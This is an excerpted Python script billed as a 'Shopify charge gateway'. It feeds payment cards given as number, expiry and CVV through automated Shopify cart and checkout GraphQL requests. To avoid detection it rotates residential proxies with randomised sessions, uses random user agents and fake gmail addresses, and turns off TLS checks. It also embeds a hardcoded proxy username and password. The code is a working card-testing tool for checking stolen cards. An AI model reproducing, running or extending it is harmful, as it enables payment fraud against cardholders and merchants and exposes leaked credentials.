...
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║           AK SHOPIFY GRAPHQL GATEWAY                      ║
║                                                           ║
║  Fast, reliable Shopify charge gateway using GraphQL API ║
║                                                           ║
║  Author:  AK                                              ║
║  Version: 1.0.0                                           ║
║  Created: 2024-11-26                                      ║
...
# ============================================
GATEWAY_CONFIG = {
    "name": "AK Shopify Gateway",
    "version": "1.0.0",
    "author": "AK",
    "created": "2024-11-26",
    "method": "GraphQL Storefront API",
    "description": "Fast GraphQL-based Shopify charge gateway with proxy support"
}


def get_proxy():
    """Default proxy - NOT USED, user proxy will be passed as parameter"""
    host, port, user, password = "ipv6-residential-bridge.bytezero.io", "1111", "0gzKNdn7m1-country-US", "8%2HUKRlNsR1"
    return f"http://{user}:{password}@{host}:{port}"

def generate_random_session(proxy_str):
    """
    Generate random session ID for Lightning proxies
    Converts: user-session-ABC123-sessTime-1 
    To: user-session-XYZ789-sessTime-1 (random session each time)
    
    This enables true rotation for session-based proxies
    """
    if not proxy_str:
        return proxy_str
    
    # Check if it's a Lightning proxy with session parameter
    if "-session-" in proxy_str and "-sessTime-" in proxy_str:
        try:
            # Generate random session ID (12 characters)
            session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            
            # Split and reconstruct
            parts = proxy_str.split("-session-")
            before_session = parts[0]
            after_session = parts[1]
            
            # Get the part after session
            session_parts = after_session.split("-sessTime-")
            sesstime_value = session_parts[1]
            
            # Reconstruct with new random session
            new_proxy = f"{before_session}-session-{session_id}-sessTime-{sesstime_value}"
            
            return new_proxy
        except Exception as e:
            print(f"Error generating random session: {e}")
            return proxy_str
    else:
        # Not a Lightning proxy or no session parameter - return as is
        return proxy_str

def format_proxy_for_httpx(proxy_str):
    """
    Format proxy for httpx
    Input: user:pass@ip:port or ip:port:user:pass
...
async def check_ip_with_proxy(proxy=None):
    """Check IP with optional proxy"""
    try:
        if proxy:
            proxy_formatted = format_proxy_for_httpx(proxy)
            async with httpx.AsyncClient(proxy=proxy_formatted, timeout=10, verify=False) as client:
...
async def autoshopify(url, card, session, user_email=None):
    """
    Shopify GraphQL charge function
    
    Args:
        url: Shopify site URL
        card: Card string (cc|mm|yyyy|cvv)
        session: httpx.AsyncClient session (with or without proxy)
        user_email: Optional custom email (default: random gmail)
    
    Returns:
        dict: {Response, Status, Gateway, Price, cc}
    """
    output = {
    ...
    start = time.time()
    total = "-"  # Default value to avoid undefined variable errors
    getua = get_random_user_agent()
    clienthint = platform(getua)
    
    # Use custom email or random
    if user_email:
        gmail = user_email
    else:
        gmail = f"gmail{__import__('random').randint(100000,999999)}@gmail.com"
    ...
    try:
        ...
        # Handle cards with extra info after CVV (e.g., CC|MM|YY|CVV|BANK|TYPE)
        card_parts = card.split("|")
        if len(card_parts) >= 4:
            cc, mes, ano, cvv = map(str.strip, card_parts[:4])  # Take only first 4 parts
        else:
        ...
        json_data = {
            'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode)@inContext(country:$country language:$language){cartCreate(input:$input){cart{id checkoutUrl cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}}userErrors{message field code}}}',
            'variables': {
                'input': {
                    'lines': [
                        {
        ...
        response = await session.post(f'{url}/api/2024-01/graphql.json', params=params, headers=headers, json=json_data, timeout=12, follow_redirects=True)
        ...
        try:
            ...
            if not response_text or response_text.strip() == "":
                output.update({
                    "Response": "Empty response from GraphQL",
                    "Status": False,
                    "Gateway": "-",
                    "Price": "-",
                })
            ...
            # print(f"DEBUG Response: {json.dumps(response_data)[:500]}")
            
            # Check if response has expected structure
            if "data" not in response_data or not response_data.get("data"):
                # Debug output
                print(f"DEBUG: Response keys: {list(response_data.keys())}")
                print(f"DEBUG: Full response: {json.dumps(response_data)[:300]}")
                output.update({
                    "Response": "Invalid GraphQL response structure",
                    "Status": False,
                    "Gateway": "-",
                    "Price": "-",
                })
            ...
            # Try different response structures (API version compatibility)
            checkout_url = None
            try:
                # New API format: data.cartCreate.cart.checkoutUrl
                if "cartCreate" in response_data["data"]:
                    checkout_url = response_data["data"]["cartCreate"]["cart"]["checkoutUrl"]
                # Old API format: data.result.cart.checkoutUrl
            ...
            if not checkout_url:
                output.update({
                    "Response": "Checkout URL not found in response",
                    "Status": False,
                    "Gateway": "-",
                    "Price": "-",
                })
            ...
            output.update({
                "Response": f"Missing key in response: {str(e)}",
                "Status": False,
                "Gateway": "-",
                "Price": "-",
            })
            ...
            output.update({
                "Response": f"Cart create error: {str(e)}",
                "Status": False,
                "Gateway": "-",
                "Price": "-",
            })
        ...
        request = await session.get(checkout_url, headers=headers, params=params, follow_redirects=True, timeout=12)
        ...
        request = await session.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, timeout=12)
        # print(request.text)
        ...
        request = await session.post(f'{url}/checkouts/unstable/graphql', params=params, headers=headers, json=json_data, timeout=12)
...
#		signedHandle3 = delivery[2]["signedHandle"]
        ...
        for _ in range(3):
            request = await session.post(f'{url}/checkouts/unstable/graphql',params=params,headers=headers,json=selected_json_data, timeout=12)
            # print(request)
...
async def charge_shopify_graphql(url, card, user_proxy=None, user_email=None):
    """
    Main function to charge Shopify site using GraphQL
    
    Args:
        url: Shopify site URL
        card: Card string (cc|mm|yyyy|cvv)
        user_proxy: Optional user proxy (format: user:pass@ip:port or ip:port:user:pass)
        user_email: Optional custom email
    
    Returns:
        dict: {Response, Status, Gateway, Price, cc, Time}
    """
    ...
    try:
        ...
        if user_proxy:
            # Generate random session for rotating proxies (Lightning, etc.)
            user_proxy = generate_random_session(user_proxy)
            
            proxy_formatted = format_proxy_for_httpx(user_proxy)
        ...
        # Retry logic for connection errors (compress style)
        retries = 0
        max_retries = 2
        result = None
        ...
        while retries <= max_retries:
            try:
                ...
                if proxy_formatted:
                    async with httpx.AsyncClient(proxy=proxy_formatted, timeout=60, verify=False) as session:
                        result = await autoshopify(url, card, session, user_email)
                else:
                    async with httpx.AsyncClient(timeout=60, verify=False) as session:
                        result = await autoshopify(url, card, session, user_email)
                
                # Check if we got a connection error that needs retry
                ...
                # Only mark as PROXY DEAD for actual proxy errors
                proxy_error_detected = True
                error_msg = str(e).lower()
                
                # Detect specific proxy errors
                if "407" in error_msg or "authentication" in error_msg:
                    result = {
                        "Response": "❌ PROXY DEAD - Authentication Failed (407)",
                        "Status": False,
                        "Gateway": "-",
                        "Price": "-",
                        "Error_Type": "PROXY_AUTH_FAILED"
                    }
                elif "connection refused" in error_msg or "cannot connect" in error_msg:
                    result = {
                        "Response": "❌ PROXY DEAD - Connection Refused",
                        "Status": False,
                        "Gateway": "-",
                        "Price": "-",
                    ...
                    result = {
                        "Response": "❌ PROXY DEAD - Connection Timeout",
                        "Status": False,
                        "Gateway": "-",
                        "Price": "-",
                    ...
                    result = {
                        "Response": "❌ PROXY DEAD - Host Unreachable",
                        "Status": False,
                        "Gateway": "-",
                        "Price": "-",
                    ...
                    result = {
                        "Response": f"❌ PROXY DEAD - {str(e)[:100]}",
                        "Status": False,
                        "Gateway": "-",
                        "Price": "-",
                ...
                # Only show PROXY DEAD if proxy is being used
                if user_proxy:
                    proxy_error_detected = True
                    result = {
                        "Response": "❌ PROXY DEAD - Connection Timeout",
                    ...
                    break
                # Without proxy, retry or show generic timeout
                    ...
                    result = {
                        "Response": "❌ Site Connection Timeout",
                        "Status": False,
                        "Gateway": "-",
                        "Price": "-"
                    }
                ...
                if user_proxy:
                    proxy_error_detected = True
                    result = {
                        "Response": "❌ PROXY DEAD - Cannot Connect",
                        "Status": False,
                        "Gateway": "-",
                        "Price": "-",
                        "Error_Type": "PROXY_CONNECT_ERROR"
                    }
                    break
                # Without proxy, retry or show generic error
                elif retries < max_retries:
                    retries += 1
                    await asyncio.sleep(1)
                    continue
                    ...
                    result = {
                        "Response": "❌ Site Connection Failed",
                        "Status": False,
                        "Gateway": "-",
                        "Price": "-"
                    }
                ...
                # Only mark as PROXY DEAD if proxy is used AND error is proxy-related
                if user_proxy and any(keyword in error_str for keyword in [
                    'proxy', 'socks', 'tunnel', '407', 'authentication required'
                ]):
                    proxy_error_detected = True
                    result = {
                        "Response": f"❌ PROXY DEAD - {str(e)[:100]}",
                ...
                # Generic error handling (no PROXY DEAD)
                if retries < max_retries:
                    retries += 1
                    await asyncio.sleep(1)
                    continue
        ...
        # Add time and gateway info to result
        elapsed = time.time() - start_time
        result["Time"] = round(elapsed, 2)
        result["Gateway_Version"] = GATEWAY_CONFIG['version']
        result["Powered_By"] = GATEWAY_CONFIG['author']
        
        # Add proxy status indicator
        if user_proxy:
            result["Proxy_Used"] = "Yes"
            if proxy_error_detected:
                result["Proxy_Status"] = "DEAD"
        else:
            result["Proxy_Used"] = "No"
